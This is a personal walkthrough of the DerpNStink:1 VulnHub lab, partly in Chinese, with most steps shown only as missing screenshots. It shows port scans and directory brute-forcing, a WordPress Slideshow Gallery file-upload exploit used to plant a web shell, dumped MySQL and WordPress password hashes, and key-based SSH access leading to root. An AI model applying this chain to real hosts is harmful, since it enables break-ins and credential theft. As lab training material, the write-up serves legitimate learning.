[https://www.vulnhub.com/entry/derpnstink-1,221/](https://www.vulnhub.com/entry/derpnstink-1,221/)
 
参考资料  
[https://blog.csuttles.io/post/derpnstink-1/](https://blog.csuttles.io/post/derpnstink-1/)  
目标是查找flag
 
[https://www.youtube.com/watch?v=mSpG9wEjjdg](https://www.youtube.com/watch?v=mSpG9wEjjdg)
    
信息探测  
┌──(kali㉿kali)-[~/Desktop]  
└─$ sudo nmap -T5 -p- -A 192.168.163.152  
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-07-06 00:32 EDT  
Nmap scan report for 192.168.163.152  
Host is up (0.0010s latency).  
Not shown: 65532 closed tcp ports (reset)  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.2  
22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 1024 12:4e:f8:6e:7b:6c:c6:d8:7c:d8:29:77:d1:0b:eb:72 (DSA)  
| 2048 72:c5:1c:5f:81:7b:dd:1a:fb:2e:59:67:fe:a6:91:2f (RSA)  
| 256 06:77:0f:4b:96:0a:3a:2c:3b:f0:8c:2b:57:b5:97:bc (ECDSA)  
|_ 256 28:e8:ed:7c:60:7f:19:6c:e3:24:79:31:ca:ab:5d:2d (ED25519)  
80/tcp open http Apache httpd 2.4.7 ((Ubuntu))  
|_http-server-header: Apache/2.4.7 (Ubuntu)  
|_http-title: DeRPnStiNK  
| http-robots.txt: 2 disallowed entries  
|_/php/ /temporary/  
MAC Address: 00:0C:29:E8:EF:78 (VMware)  
Device type: general purpose  
Running: Linux 3.X|4.X  
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4  
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16  
Network Distance: 1 hop  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
TRACEROUTE  
HOP RTT ADDRESS  
1 1.03 ms 192.168.163.152
 
OS and Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .  
Nmap done: 1 IP address (1 host up) scanned in 15.66 seconds   ┌──(kali㉿kali)-[~/Desktop]  
└─$
 
漏洞利用  
┌──(kali㉿kali)-[~/Desktop]  
└─$ searchsploit slideshow | grep WordPress  
WordPress Plugin 1-jquery-photo-gallery-Slideshow-flash 1.01 - Cross-Site Scriptin | php/webapps/36382.txt  
WordPress Plugin cnhk-Slideshow - Arbitrary File Upload | php/webapps/39190.php  
WordPress Plugin CP Image Store with Slideshow 1.0.5 - Arbitrary File Download | php/webapps/37559.txt  
WordPress Plugin Feature Slideshow 1.0.6 - 'src' Cross-Site Scripting | php/webapps/35285.txt  
WordPress Plugin GB Gallery Slideshow - '/wp-admin/admin-ajax.php' SQL Injection | php/webapps/39282.txt  
WordPress Plugin image Gallery with Slideshow 1.5 - Multiple Vulnerabilities | php/webapps/17761.txt  
WordPress Plugin LB Mixed Slideshow - 'upload.php' Arbitrary File Upload | php/webapps/37418.php  
WordPress Plugin SH Slideshow 3.1.4 - SQL Injection | php/webapps/17748.txt  
WordPress Plugin Slideshow - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/37948.txt  
WordPress Plugin Slideshow Gallery 1.1.x - 'border' Cross-Site Scripting | php/webapps/36631.txt  
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload | php/webapps/34514.txt  
WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload | php/webapps/34681.py  
WordPress Plugin WP Easy Slideshow 1.0.3 - Multiple Vulnerabilities | php/webapps/36612.txt   ┌──(kali㉿kali)-[~/Desktop]  
└─$
 
uri 服务的访问点 url 是整个地址 uri就是资源的点 注意端点访问
 
追加hosts
 
──(kali㉿kali)-[~/Desktop/OSCP/drep]  
└─$ echo '192.168.163.152 derpnstink.local' | sudo tee -a /etc/hosts
    ![[DerpNStink：1 image fffc395aee387e28.png|Exported image]]  

mysql  
john --show 2.txt  
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA  
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA  
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA  
root:*E74858DB86EBA20BC33D0AECAE8A8108C56B17FA  
debian-sys-maint:*B95758C76129F85E0D68CF79F38B66F156804E93  
unclestinky:*9B776AFB479B31E8047026F1185E952DD1E530CB  
phpmyadmin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441
    
┌──(kali㉿kali)-[~/Desktop/OSCP/drep]  
└─$ gobuster dir -u [http://192.168.163.152/](http://192.168.163.152/) -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x .html,.php,.txt,.bak  
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url: [http://192.168.163.152/](http://192.168.163.152/)  
[+] Method: GET  
[+] Threads: 10  
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes: 404  
[+] User Agent: gobuster/3.6  
[+] Extensions: txt,bak,html,php  
[+] Timeout: 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.html (Status: 403) [Size: 287]  
/index.html (Status: 200) [Size: 1298]  
/.php (Status: 403) [Size: 286]  
/weblog (Status: 301) [Size: 318] [--\> [http://192.168.163.152/weblog/](http://192.168.163.152/weblog/)]  
/php (Status: 301) [Size: 315] [--\> [http://192.168.163.152/php/](http://192.168.163.152/php/)]  
/css (Status: 301) [Size: 315] [--\> [http://192.168.163.152/css/](http://192.168.163.152/css/)]  
/js (Status: 301) [Size: 314] [--\> [http://192.168.163.152/js/](http://192.168.163.152/js/)]  
/javascript (Status: 301) [Size: 322] [--\> [http://192.168.163.152/javascript/](http://192.168.163.152/javascript/)]  
/robots.txt (Status: 200) [Size: 53]  
/.html (Status: 403) [Size: 287]  
/.php (Status: 403) [Size: 286]  
/temporary (Status: 301) [Size: 321] [--\> [http://192.168.163.152/temporary/](http://192.168.163.152/temporary/)]  
/server-status (Status: 403) [Size: 295]  
Progress: 594250 / 1038220 (57.24%)
   

Progress: 642576 / 1038220 (61.89%)^C  
[!] Keyboard interrupt detected, terminating.  
Progress: 644021 / 1038220 (62.03%)  
===============================================================  
Finished  
===============================================================   ┌──(kali㉿kali)-[~/Desktop/OSCP/drep]  
└─$
 
文件上传漏洞  
[https://www.exploit-db.com/exploits/34514](https://www.exploit-db.com/exploits/34514)
 
触发机制  
[http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php](http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/shell.php)
   
![[DerpNStink：1 image 2dda3eeecc977e3e.png|Exported image]]  
![[DerpNStink：1 image b0c34532166082ba.png|Exported image]]  
![[DerpNStink：1 image 56692fca6bea70c1.png|Exported image]]   
mysql\> select * from wp_users;  
select * from wp_users;  
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+  
| ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | flag2 |  
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+  
| 1 | unclestinky | $P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41 | unclestinky | unclestinky@DeRPnStiNK.local | | 2017-11-12 03:25:32 | 1510544888:$P$BQbCmzW/ICRqb1hU96nIVUFOlNMKJM1 | 0 | unclestinky | |  
| 2 | admin | $P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/ | admin | admin@derpnstink.local | | 2017-11-13 04:29:35 | | 0 | admin | |  
+----+-------------+------------------------------------+---------------+------------------------------+----------+---------------------+-----------------------------------------------+-------------+--------------+-------+  
2 rows in set (0.00 sec)
   
![[DerpNStink：1 image 528ef0d9b4cedba5.png|Exported image]]  
![[DerpNStink：1 image 8c96ee3f1da119cf.png|Exported image]]  

ssh stinky@192.168.163.152 -i id_rsa -o PubkeyAcceptedKeyTypes=ssh-rsa

![[DerpNStink：1 image bb43548d015afaf4.png|Exported image]]  
![[DerpNStink：1 image 74cc86be3a8f73ca.png|Exported image]]  
![[DerpNStink：1 image b954fb21802e14f5.png|Exported image]]  
![[DerpNStink：1 image 9ac7a6bf596d9c62.png|Exported image]]  
![[DerpNStink：1 image 1e03f609a3076f57.png|Exported image]]   ![[DerpNStink：1 image af816d2500aa3603.png|Exported image]]  

拿到root权限

![[DerpNStink：1 image 8e5e78783ced0536.png|Exported image]]